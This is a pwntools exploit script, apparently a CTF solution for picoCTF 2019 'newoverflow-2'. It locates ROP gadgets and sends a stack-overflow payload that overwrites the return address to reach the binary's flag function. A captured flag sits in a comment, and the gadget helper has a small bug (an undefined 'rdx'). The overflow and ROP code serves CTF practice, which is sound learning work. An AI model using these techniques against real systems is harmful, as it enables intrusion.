from pwn import *
import sys
import subprocess
import r2pipe
# picoCTF{r0p_1t_d0nT_st0p_1t_a7e6da52}
argv = sys.argv

DEBUG = True
BINARY = './vuln'

context.binary = BINARY
context.terminal = ['tmux', 'splitw', '-v']

if context.bits == 64:
  r = process(['ROPgadget', '--binary', BINARY])
  gadgets = r.recvall().strip().split('\n')[2:-2]
  gadgets = map(lambda x: x.split(' : '),gadgets)
  gadgets = map(lambda x: (int(x[0],16),x[1]),gadgets)
  r.close()

  pop_rdi = 0
  pop_rsi_r15 = 0
  pop_rdx = 0

  for addr, name in gadgets:
    if 'pop rdi ; ret' in name:
      pop_rdi = addr
    if 'pop rsi ; pop r15 ; ret' in name:
      pop_rsi_r15 = addr
    if 'pop rdx ; ret' in name:
      pop_rdx = addr

  def call(f, a1, a2, a3):
    out = ''
    if a1 != None:
      out += p64(pop_rdi)+p64(a1)
    if a2 != None:
      out += p64(pop_rsi_r15)+p64(a2)*2
    if a3 != None:
      if pop_rdx == 0:
        print 'RDX GADGET NOT FOUND'
        exit(-1)
      else:
        out += p64(rdx)+p64(a3)
    return out+p64(f)

def attach_gdb():
  gdb.attach(sh)


if DEBUG:
  context.log_level = 'debug'

if len(argv) < 2:
  stdout = process.PTY
  stdin = process.PTY

  sh = process(BINARY, stdout=stdout, stdin=stdin)

  if DEBUG:
    attach_gdb()

  REMOTE = False
else:
  s = ssh(host='2019shell1.picoctf.com', user='sashackers', password="XXX")
  sh = s.process('vuln', cwd='/problems/newoverflow-2_2_53b88b20cc0021816d391f51abb1c987')
  REMOTE = True


# $ r2 ./vuln
# [0x00400680]> aaaa
# [0x00400680]> afl~flag
# 0x0040084d    3 101          sym.flag
# [0x00400680]> afl~main
# 0x004008ce    1 105          main

win_addr = 0x0040084d
main_addr = 0x004008ce
payload = 'a'*(0x40+8)+p64(main_addr)+p64(win_addr)

sh.sendlineafter('?\n', payload)
sh.sendlineafter('?\n', 'a')
sh.interactive()
